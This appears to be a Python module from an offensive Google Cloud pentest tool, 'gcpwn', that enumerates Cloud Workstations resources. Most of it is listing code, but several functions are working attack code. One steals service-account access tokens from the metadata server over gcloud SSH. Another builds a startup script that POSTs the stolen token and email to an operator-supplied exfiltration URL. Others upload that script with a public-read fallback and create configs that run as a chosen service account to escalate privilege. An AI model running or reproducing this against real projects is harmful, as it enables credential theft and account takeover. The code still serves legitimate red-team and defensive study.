from __future__ import annotations

import json
import subprocess

from gcpwn.core.resource import GcpListResource
from gcpwn.core.utils.iam_permissions import permissions_with_prefixes
from gcpwn.core.utils.module_helpers import (
    extract_path_segment,
    region_resolver_for,
)

_METADATA_TOKEN_URL = (
    "http://metadata.google.internal/computeMetadata/v1/instance/"
    "service-accounts/default/token"
)
_METADATA_EMAIL_URL = (
    "http://metadata.google.internal/computeMetadata/v1/instance/"
    "service-accounts/default/email"
)


def ssh_query_metadata_ws(
    project_id: str,
    region: str,
    cluster_id: str,
    config_id: str,
    workstation_id: str,
    timeout: int = 60,
) -> tuple[str | None, str | None]:
    """Query the IMDS token and email via gcloud workstations ssh.

    Returns (email, access_token) on success; (None, None) on failure.
    SSH on Cloud Workstations goes through an IAP-based proxy, so this works
    without direct network access to the workstation VM.
    """
    base_flags = [
        f"--project={project_id}",
        f"--region={region}",
        f"--cluster={cluster_id}",
        f"--config={config_id}",
    ]

    def _ssh(command: str) -> str | None:
        cmd = (
            ["gcloud", "workstations", "ssh", workstation_id]
            + base_flags
            + ["--command", command]
        )
        print(f"  [ws/ssh] {' '.join(cmd[:6])} --command '{command[:80]}'")
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            out = result.stdout.strip()
            if result.returncode == 0 and out:
                lines = [
                    ln for ln in out.splitlines()
                    if not ln.startswith("Picking ") and not ln.startswith("Listening ")
                    and not ln.startswith("Warning:")
                ]
                return "\n".join(lines).strip() or None
            if result.returncode != 0:
                print(f"  [ws/ssh] exit={result.returncode} stderr={result.stderr[:200]}")
        except subprocess.TimeoutExpired:
            print(f"  [ws/ssh] timed out after {timeout}s")
        except FileNotFoundError:
            print("  [ws/ssh] gcloud not found in PATH")
        except Exception as exc:
            print(f"  [ws/ssh] error: {exc}")
        return None

    raw_tok = _ssh(
        f"curl -sf -H 'Metadata-Flavor: Google' {_METADATA_TOKEN_URL}"
    )
    if not raw_tok:
        return None, None

    access_token: str | None = None
    try:
        access_token = json.loads(raw_tok).get("access_token")
    except (json.JSONDecodeError, AttributeError):
        access_token = raw_tok.strip() if raw_tok.strip() else None

    if not access_token:
        return None, None

    email = _ssh(
        f"curl -sf -H 'Metadata-Flavor: Google' {_METADATA_EMAIL_URL}"
    )
    return email, access_token


def _workstations():
    """Import the workstations_v1 GAPIC module lazily.

    Deferring the import keeps this module importable (for contract tests /
    enum_all listing) even if the optional ``google-cloud-workstations`` package
    is not installed; the clear RuntimeError only surfaces if someone actually
    runs the module without the library present.
    """
    try:
        from google.cloud import workstations_v1
    except Exception as exc:  # pragma: no cover - import guard
        raise RuntimeError(
            "Cloud Workstations enumeration requires the `google-cloud-workstations` package. "
            "Install it (pip install google-cloud-workstations) to enumerate Cloud Workstations resources."
        ) from exc
    return workstations_v1


resolve_locations = region_resolver_for("workstations", ("workstations", "v1"))


class WorkstationsClustersResource(GcpListResource):
    """List/get Cloud Workstations clusters via the workstations_v1 WorkstationsClient.

    A workstation cluster is the regional VPC-attached container for workstation
    configs/workstations. It exposes no per-workstation service account itself
    (that lives on the config's GCE host), so the offensively-useful columns are
    the cluster identity plus its attached network and control-plane IP. Clusters
    are listed per region (projects/<p>/locations/<loc>), so this runs scope=REGION
    with the default PARENT_FROM_PROJECT_LOCATION. supports_iam=False (the cluster
    name is not a testIamPermissions target on the GAPIC client).
    """

    SERVICE_LABEL = "Cloud Workstations"
    TABLE_NAME = "workstations_clusters"
    COLUMNS = ["location", "cluster_id", "name", "network", "control_plane_ip"]
    ACTION_RESOURCE_TYPE = "workstationClusters"
    LIST_PERMISSION = "workstations.workstationClusters.list"
    GET_PERMISSION = "workstations.workstationClusters.get"
    ID_FIELD = "cluster_id"

    def _build_client(self, session):
        return _workstations().WorkstationsClient(credentials=session.credentials)

    def _list_items(self, parent, **_):
        return self.client.list_workstation_clusters(
            request=_workstations().ListWorkstationClustersRequest(parent=parent)
        )

    def _get_item(self, resource_id, **_):
        return self.client.get_workstation_cluster(
            request=_workstations().GetWorkstationClusterRequest(name=resource_id)
        )

    def _extra_save_fields(self, raw):
        return {
            "network": str(raw.get("network", "") or ""),
            "control_plane_ip": str(raw.get("control_plane_ip", "") or ""),
        }

    def create(self, parent: str, cluster_id: str, cluster, timeout: int = 1500) -> dict:
        ws = _workstations()
        lro = self.client.create_workstation_cluster(
            request=ws.CreateWorkstationClusterRequest(
                parent=parent,
                workstation_cluster_id=cluster_id,
                workstation_cluster=cluster,
            )
        )
        result = lro.result(timeout=timeout)
        return {"name": getattr(result, "name", f"{parent}/workstationClusters/{cluster_id}")}

    def delete(self, *, name: str) -> None:
        try:
            ws = _workstations()
            lro = self.client.delete_workstation_cluster(
                request=ws.DeleteWorkstationClusterRequest(name=name)
            )
            lro.result(timeout=120)
        except Exception:
            pass


class WorkstationsConfigsResource(GcpListResource):
    """List/get Cloud Workstations configs (nested under a cluster).

    A workstation config is the template that backing workstation VMs are created
    from. Its GCE host carries the service account every workstation built from
    this config runs as (``host.gce_instance.service_account``) -- the priv-esc
    signal: a principal who can create/update a config, or create a workstation
    from it, gains an oracle to act as that SA. Configs are listed under a parent
    cluster (PARENT_FROM_PROJECT_LOCATION=False); listing them is a permission on
    the parent cluster (LIST_RESOURCE_TYPE=workstationClusters). The
    WorkstationsClient exposes testIamPermissions, so supports_iam=True.
    """

    SERVICE_LABEL = "Cloud Workstations"
    TABLE_NAME = "workstations_configs"
    COLUMNS = ["location", "cluster_id", "config_id", "name", "service_account", "machine_type"]
    ACTION_RESOURCE_TYPE = "workstationConfigs"
    LIST_PERMISSION = "workstations.workstationConfigs.list"
    LIST_RESOURCE_TYPE = "workstationClusters"  # listing configs is a permission on the parent cluster
    GET_PERMISSION = "workstations.workstationConfigs.get"
    TEST_IAM_API_NAME = "workstations.workstationConfigs.testIamPermissions"
    TEST_IAM_PERMISSIONS = permissions_with_prefixes(
        "workstations.workstationConfigs.",
        exclude_permissions=("workstations.workstationConfigs.create", "workstations.workstationConfigs.list"),
    )
    ID_FIELD = "config_id"
    PARENT_FROM_PROJECT_LOCATION = False  # listed under a parent cluster

    def _build_client(self, session):
        return _workstations().WorkstationsClient(credentials=session.credentials)

    def _list_items(self, parent, **_):
        return self.client.list_workstation_configs(
            request=_workstations().ListWorkstationConfigsRequest(parent=parent)
        )

    def _get_item(self, resource_id, **_):
        return self.client.get_workstation_config(
            request=_workstations().GetWorkstationConfigRequest(name=resource_id)
        )

    def _extra_save_fields(self, raw):
        gce_instance = {}
        host = raw.get("host")
        if isinstance(host, dict):
            candidate = host.get("gce_instance")
            if isinstance(candidate, dict):
                gce_instance = candidate
        return {
            "cluster_id": extract_path_segment(str(raw.get("name", "") or ""), "workstationClusters"),
            "service_account": str(gce_instance.get("service_account", "") or ""),
            "machine_type": str(gce_instance.get("machine_type", "") or ""),
        }

    @staticmethod
    def _build_startup_script(target_sa: str, exfil_url: str = "") -> str:
        script = (
            "#!/bin/bash\n"
            "B=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default; "
            "H='Metadata-Flavor: Google'; "
            "EML=$(curl -sfm10 -H \"$H\" \"${B}/email\"); "
            "TOK=$(curl -sfm10 -H \"$H\" \"${B}/token\" | python3 -c \"import sys,json; print(json.load(sys.stdin).get('access_token',''))\"); "
            "echo GCPWN_WS_EMAIL=$EML; "
            "echo GCPWN_WS_TOKEN=$TOK; "
        )
        if exfil_url:
            script += f'curl -sfm20 -X POST "{exfil_url}" -d "email=$EML&tok=$TOK"; '
        return script

    @staticmethod
    def build_config_proto(target_sa: str, exfil_url: str = "",
                           startup_script_uri: str = ""):
        from google.cloud import workstations_v1
        gce = workstations_v1.WorkstationConfig.Host.GceInstance(
            service_account=target_sa,
            service_account_scopes=["https://www.googleapis.com/auth/cloud-platform"],
        )
        if startup_script_uri:
            # The GCE host VM (running as TARGET_SA) downloads and runs this script on boot.
            # Logs are shipped to google_metadata_script_runner (singular) in Cloud Logging.
            gce.startup_script_uri = startup_script_uri
        return workstations_v1.WorkstationConfig(
            host=workstations_v1.WorkstationConfig.Host(gce_instance=gce),
            container=workstations_v1.WorkstationConfig.Container(
                # Predefined base image (GCP-hosted, no internet required for pull)
                image="us-central1-docker.pkg.dev/cloud-workstations-images/predefined/base:latest",
            ),
        )

    @staticmethod
    def upload_startup_script(credentials, project_id: str, target_sa: str,
                              exfil_url: str = "") -> tuple[str, str]:
        """Upload the startup script to a temp GCS object and grant TARGET_SA read.

        Returns (gs_uri, bucket_name) so the caller can delete the object on cleanup.
        Raises RuntimeError on failure.
        """
        import time
        from google.cloud import storage
        from google.api_core import exceptions as api_exc

        script = WorkstationsConfigsResource._build_startup_script(target_sa, exfil_url)
        bucket_name = f"{project_id}-gcpwn-ws-script"
        object_name = f"gcpwn-startup-{int(time.time()) % 100000}.sh"
        gs_uri = f"gs://{bucket_name}/{object_name}"

        client = storage.Client(credentials=credentials, project=project_id)
        # Ensure the bucket exists; create it if not.
        try:
            bucket = client.get_bucket(bucket_name)
        except api_exc.NotFound:
            bucket = client.create_bucket(bucket_name, location="us-central1")
        except Exception as exc:
            raise RuntimeError(f"Cannot access/create script bucket {bucket_name}: {exc}") from exc

        # Grant TARGET_SA storage.objectViewer at the bucket level so the workstation
        # VM (which runs as TARGET_SA) can download the startup script.
        # Bucket-level IAM is the correct scope — per-object IAM only accepts legacy roles.
        try:
            bkt_policy = bucket.get_iam_policy(requested_policy_version=3)
            bkt_policy.version = 3
            bkt_policy.bindings.append({
                "role": "roles/storage.objectViewer",
                "members": {f"serviceAccount:{target_sa}"},
            })
            bucket.set_iam_policy(bkt_policy)
        except Exception:
            pass  # If UBAC/IAM fails, rely on object ACL below

        # Upload — try publicRead ACL as a belt-and-suspenders fallback
        blob = bucket.blob(object_name)
        try:
            blob.upload_from_string(script, content_type="text/x-shellscript",
                                    predefined_acl="publicRead")
        except Exception:
            blob.upload_from_string(script, content_type="text/x-shellscript")

        return gs_uri, object_name, bucket_name

    @staticmethod
    def delete_startup_script(credentials, project_id: str, bucket_name: str, object_name: str) -> None:
        try:
            from google.cloud import storage
            client = storage.Client(credentials=credentials, project=project_id)
            bucket = client.bucket(bucket_name)
            bucket.blob(object_name).delete()
        except Exception:
            pass

    def create(self, parent: str, config_id: str, config, timeout: int = 300) -> dict:
        ws = _workstations()
        lro = self.client.create_workstation_config(
            request=ws.CreateWorkstationConfigRequest(
                parent=parent,
                workstation_config_id=config_id,
                workstation_config=config,
            )
        )
        result = lro.result(timeout=timeout)
        return {"name": getattr(result, "name", f"{parent}/workstationConfigs/{config_id}")}

    def delete(self, *, name: str) -> None:
        try:
            ws = _workstations()
            lro = self.client.delete_workstation_config(
                request=ws.DeleteWorkstationConfigRequest(name=name)
            )
            lro.result(timeout=120)
        except Exception:
            pass


class WorkstationsWorkstationsResource(GcpListResource):
    """List/get individual Cloud Workstations (nested under a config).

    A workstation is a running developer VM created from a config. Capturing its
    state and host (the per-workstation FQDN used to reach the running instance)
    surfaces reachable dev environments. Workstations are listed under a parent
    config (PARENT_FROM_PROJECT_LOCATION=False); listing them is a permission on
    the parent config (LIST_RESOURCE_TYPE=workstationConfigs). The
    WorkstationsClient exposes testIamPermissions, so supports_iam=True.
    """

    SERVICE_LABEL = "Cloud Workstations"
    TABLE_NAME = "workstations_workstations"
    COLUMNS = ["location", "cluster_id", "config_id", "workstation_id", "name", "state", "host"]
    ACTION_RESOURCE_TYPE = "workstations"
    LIST_PERMISSION = "workstations.workstations.list"
    LIST_RESOURCE_TYPE = "workstationConfigs"  # listing workstations is a permission on the parent config
    GET_PERMISSION = "workstations.workstations.get"
    TEST_IAM_API_NAME = "workstations.workstations.testIamPermissions"
    TEST_IAM_PERMISSIONS = permissions_with_prefixes(
        "workstations.workstations.",
        exclude_permissions=("workstations.workstations.create", "workstations.workstations.list"),
    )
    ID_FIELD = "workstation_id"
    PARENT_FROM_PROJECT_LOCATION = False  # listed under a parent config

    def _build_client(self, session):
        return _workstations().WorkstationsClient(credentials=session.credentials)

    def _list_items(self, parent, **_):
        return self.client.list_workstations(
            request=_workstations().ListWorkstationsRequest(parent=parent)
        )

    def _get_item(self, resource_id, **_):
        return self.client.get_workstation(
            request=_workstations().GetWorkstationRequest(name=resource_id)
        )

    def _extra_save_fields(self, raw):
        name = str(raw.get("name", "") or "")
        return {
            "cluster_id": extract_path_segment(name, "workstationClusters"),
            "config_id": extract_path_segment(name, "workstationConfigs"),
            "state": str(raw.get("state", "") or ""),
            "host": str(raw.get("host", "") or ""),
        }

    def create(self, parent: str, workstation_id: str, workstation, timeout: int = 300) -> dict:
        ws = _workstations()
        lro = self.client.create_workstation(
            request=ws.CreateWorkstationRequest(
                parent=parent,
                workstation_id=workstation_id,
                workstation=workstation,
            )
        )
        result = lro.result(timeout=timeout)
        return {"name": getattr(result, "name", f"{parent}/workstations/{workstation_id}")}

    def start(self, *, name: str, wait: int = 60) -> None:
        ws = _workstations()
        lro = self.client.start_workstation(request=ws.StartWorkstationRequest(name=name))
        lro.result(timeout=wait)

    def delete(self, *, name: str) -> None:
        try:
            ws = _workstations()
            lro = self.client.delete_workstation(request=ws.DeleteWorkstationRequest(name=name))
            lro.result(timeout=120)
        except Exception:
            pass
